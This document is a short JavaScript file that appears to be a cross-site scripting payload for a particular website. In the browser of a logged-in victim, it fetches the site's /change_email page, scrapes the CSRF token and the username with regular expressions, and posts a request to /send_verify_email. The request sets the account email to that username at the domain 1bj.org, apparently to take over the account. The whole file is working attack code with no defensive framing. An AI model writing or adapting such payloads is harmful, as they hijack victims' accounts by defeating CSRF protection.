function getNewHttpObject() {
var objType = false;
try {
objType = new ActiveXObject('Msxml2.XMLHTTP');
} catch(e) {
try {
objType = new ActiveXObject('Microsoft.XMLHTTP');
} catch(e) {
objType = new XMLHttpRequest();
}
}
return objType;
}

function getAXAH(url){

var theHttpRequest = getNewHttpObject();
theHttpRequest.onreadystatechange = function() {processAXAH();};
theHttpRequest.open("GET", url);
theHttpRequest.send(false);

function processAXAH(){
if (theHttpRequest.readyState == 4) { if (theHttpRequest.status == 200) {

var html = theHttpRequest.responseText;
var tokloc = /_token.*value=\"(.*)"/g.exec(html);
var token = tokloc[1];
try {
var usrloc = /href="\/friends\/(.*)">My Friends/g.exec(html);
var usr = usrloc[1];
} catch(e) {
	alert('must be logged in');
}
console.log(usr + ' and ' + token);
postAXAH('http://' + window.location.hostname + '/send_verify_email', '_token=' + token + '&user_email=' + usr + '%401bj.org');

}}}}


function postAXAH(url, params) {
var theHttpRequest = getNewHttpObject();
               
theHttpRequest.onreadystatechange = function() {
	if (theHttpRequest.readyState == 4) { if (theHttpRequest.status == 200) { 

}}};
theHttpRequest.open("POST", url);
theHttpRequest.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=iso-8859-2');
theHttpRequest.send(params);

}
console.log('running script');
getAXAH('http://' + window.location.hostname + '/change_email');